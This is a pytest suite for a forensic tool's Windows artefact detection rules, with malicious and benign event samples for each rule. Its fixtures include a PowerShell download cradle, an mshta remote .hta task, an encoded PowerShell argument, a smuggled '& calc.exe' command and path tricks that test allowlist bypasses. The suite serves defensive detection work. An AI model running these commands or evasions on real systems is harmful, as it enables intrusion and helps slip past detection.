from datetime import datetime, timezone

import pytest

from investigation.core.models import Event
from investigation.core.requirements import Context
from investigation.core.store import EventStore
from investigation.modules.detections.builtin import BuiltinRules, load_rules

T0 = datetime(2024, 5, 1, tzinfo=timezone.utc)


@pytest.fixture(autouse=True)
def home(monkeypatch, tmp_path):
    monkeypatch.setenv("INVESTIGATION_HOME", str(tmp_path / "home"))


def ev(artifact, **fields):
    return Event(timestamp=T0, timestamp_desc="t", artifact=artifact, source_file="s", message="m", fields=fields)


_n = [0]


def ids(tmp_path, *events):
    _n[0] += 1
    store = EventStore(tmp_path / f"db{_n[0]}.sqlite")
    store.add_many(events)
    return {f.rule_id for f in BuiltinRules().detect(store, Context())}


CASES = [
    ("INV-ART-001", ev("bam", path=r"\Device\HarddiskVolume3\Users\bob\AppData\Local\Temp\x7.exe"),
     ev("bam", path=r"\Device\HarddiskVolume3\Program Files\App\app.exe")),
    ("INV-ART-001", ev("amcache", path=r"c:\users\public\payload.exe"), ev("amcache", path=r"c:\windows\notepad.exe")),
    ("INV-ART-002", ev("prefetch", filename="MIMIKATZ.EXE"), ev("prefetch", filename="NOTEPAD.EXE")),
    ("INV-ART-002", ev("shimcache", path=r"C:\tools\rclone.exe"), ev("shimcache", path=r"C:\Windows\regedit.exe")),
    ("INV-ART-003", ev("prefetch", filename="SVCH0ST.EXE"), ev("prefetch", filename="SVCHOST.EXE")),
    ("INV-ART-004", ev("bam", path=r"\Device\HarddiskVolume3\Users\Public\svchost.exe"),
     ev("bam", path=r"\Device\HarddiskVolume3\Windows\System32\svchost.exe")),
    ("INV-ART-005", ev("runkeys", name="upd", command=r"powershell -w hidden -c iex(...)"),
     ev("runkeys", name="OneDrive", command=r"C:\Program Files\Microsoft OneDrive\OneDrive.exe /background")),
    ("INV-ART-006", ev("services", name="x", imagepath=r"C:\ProgramData\x.exe"),
     ev("services", name="1394ohci", imagepath=r"\SystemRoot\System32\drivers\1394ohci.sys")),
    ("INV-ART-007", ev("tasks", uri=r"\Updater", action="Exec", app_name="mshta.exe", args="http://x/a.hta"),
     ev("tasks", uri=r"\Microsoft\Windows\Defrag", action="Exec", app_name=r"%windir%\system32\defrag.exe", args="-c")),
    ("INV-ART-008", ev("wmi", filter_query="SELECT * FROM __InstanceModificationEvent", command_line_template="cmd /c x"),
     ev("prefetch", filename="X.EXE")),
    ("INV-ART-009", ev("defender", type="Paths", value=r"C:\Users\Public"), ev("defender", detection_name="x")),
    ("INV-ART-010", ev("powershell_history", command="IEX (New-Object Net.WebClient).DownloadString('http://x')"),
     ev("powershell_history", command="Get-Content a.txt -Encoding UTF8")),
    ("INV-ART-011", ev("browser", url="http://x/invoice.iso", path=r"C:\Users\bob\Downloads\invoice.iso", state="complete"),
     ev("browser", url="http://x/report.pdf", path=r"C:\Users\bob\Downloads\report.pdf", state="complete")),
    ("INV-ART-012", ev("usb", vendor="SanDisk", product="Cruzer", serial="123"), ev("bam", path="x")),
    ("INV-ART-013", ev("rdp", value="10.0.0.5"), ev("rdp", path=r"C:\Users\bob\AppData\Local\Microsoft\Terminal Server Client\Cache\bcache24.bmc")),
    ("INV-ART-014", ev("recyclebin", deleted_path=r"C:\Users\bob\Desktop\tool.exe"),
     ev("recyclebin", deleted_path=r"C:\Users\bob\Desktop\notes.txt")),
    ("INV-ART-015", ev("usnjrnl", path=r"C:\Users\bob\Desktop\HOW_TO_DECRYPT.txt", reason="FILE_CREATE"),
     ev("usnjrnl", path=r"C:\Users\bob\Desktop\notes.txt", reason="FILE_CREATE")),
]


@pytest.mark.parametrize("rule,pos,neg", CASES, ids=[f"{c[0]}-{i}" for i, c in enumerate(CASES)])
def test_rule(tmp_path, rule, pos, neg):
    assert rule in ids(tmp_path, pos)
    assert rule not in ids(tmp_path, neg)


def test_alternate_fields_and_artifact_list(tmp_path, monkeypatch):
    home = tmp_path / "h"
    (home / "rules").mkdir(parents=True)
    (home / "rules" / "x.yaml").write_text(
        "- id: T-1\n  title: t\n  severity: low\n  mitre: [T1]\n  description: d\n"
        "  artifact: [bam, prefetch]\n  contains: {path|filename: [evil]}\n"
        "  not_contains: {path|filename: [whitelisted]}\n"
    )
    monkeypatch.setenv("INVESTIGATION_HOME", str(home))
    assert "T-1" in ids(tmp_path, ev("prefetch", filename="EVIL.EXE"))
    assert "T-1" in ids(tmp_path, ev("bam", path=r"c:\evil.exe"))
    assert "T-1" not in ids(tmp_path, ev("bam", path=r"c:\evil_whitelisted.exe"))
    assert "T-1" not in ids(tmp_path, ev("shimcache", path=r"c:\evil.exe"))


def test_rules_yaml_valid():
    rules = load_rules()
    assert len({r.id for r in rules}) == len(rules)
    assert sum(r.id.startswith("INV-ART-") for r in rules) == 15


@pytest.mark.parametrize("rule,evil", [
    ("INV-ART-004", ev("bam", path=r"\Device\HarddiskVolume3\Users\Public\Windows\System32\svchost.exe")),
    ("INV-ART-004", ev("amcache", path=r"c:\programdata\windows\syswow64\lsass.exe")),
    ("INV-ART-005", ev("runkeys", name="x",
                       command=r"powershell -c iex(gc C:\Users\bob\AppData\Local\Microsoft\OneDrive\x.txt)")),
    ("INV-ART-005", ev("runkeys", name="x",
                       command=r"C:\Users\bob\AppData\Local\Microsoft\OneDrive\..\..\Temp\evil.exe")),
    ("INV-ART-007", ev("tasks", uri=r"\Microsoft\Windows\Updater", action="Exec", app_name="powershell.exe",
                       args="-enc SQBFAFgA")),
])
def test_allowlists_cannot_be_abused(tmp_path, rule, evil):
    assert rule in ids(tmp_path, evil)


@pytest.mark.parametrize("rule,benign", [
    ("INV-ART-004", ev("bam", path=r"\Device\HarddiskVolume3\Windows\System32\svchost.exe")),
    ("INV-ART-004", ev("amcache", path=r"c:\windows\syswow64\svchost.exe")),
    ("INV-ART-005", ev("runkeys", name="OneDrive",
                       command='"C:\\Users\\bob\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe" /background')),
])
def test_anchored_allowlists_still_allow_real_system_paths(tmp_path, rule, benign):
    assert rule not in ids(tmp_path, benign)


@pytest.mark.parametrize("command", [
    r'"C:\Users\bob\AppData\Local\Microsoft\OneDrive\evil.exe" /background',
    r'C:\Users\bob\AppData\Local\Microsoft\Teams\evil.exe /x',
    "C:\\Users\\bob\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe /background\n& calc.exe",
])
def test_only_real_onedrive_teams_launchers_excluded(tmp_path, command):
    assert "INV-ART-005" in ids(tmp_path, ev("runkeys", name="x", command=command))


def test_real_teams_launcher_excluded(tmp_path):
    cmd = r'"C:\Users\bob\AppData\Local\Microsoft\Teams\Update.exe" --processStart "Teams.exe" --process-start-args "--system-initiated"'
    assert "INV-ART-005" not in ids(tmp_path, ev("runkeys", name="com.squirrel.Teams.Teams", command=cmd))


@pytest.mark.parametrize("command", [
    r'C:\Users\..\AppData\Local\Microsoft\OneDrive\OneDrive.exe /background',
    r'C:\Users\.\AppData\Local\Microsoft\OneDrive\OneDrive.exe',
    r'"C:\Users\..\AppData\Local\Microsoft\Teams\Update.exe" --processStart "Teams.exe"',
    r'C:\Users\bob\AppData\Local\Microsoft\OneDrive\..\OneDrive\OneDrive.exe',
])
def test_allowlist_rejects_dot_segments(tmp_path, command):
    assert "INV-ART-005" in ids(tmp_path, ev("runkeys", name="x", command=command))


@pytest.mark.parametrize("path", [
    "\\Device\\HarddiskVolume3\\W\u0130ndows\\System32\\svchost.exe",
    r"D:\Windows\System32\svchost.exe",
    r"C:\Windows\WinSxS\evil\deeper\lsass.exe",
])
def test_system_path_allowlist_not_bypassable(tmp_path, path):
    assert "INV-ART-004" in ids(tmp_path, ev("bam", path=path))


def test_onedrive_unicode_i_not_allowlisted(tmp_path):
    cmd = "C:\\Users\\bob\\AppData\\Local\\M\u0130crosoft\\OneDrive\\OneDrive.exe /background"
    assert "INV-ART-005" in ids(tmp_path, ev("runkeys", name="x", command=cmd))
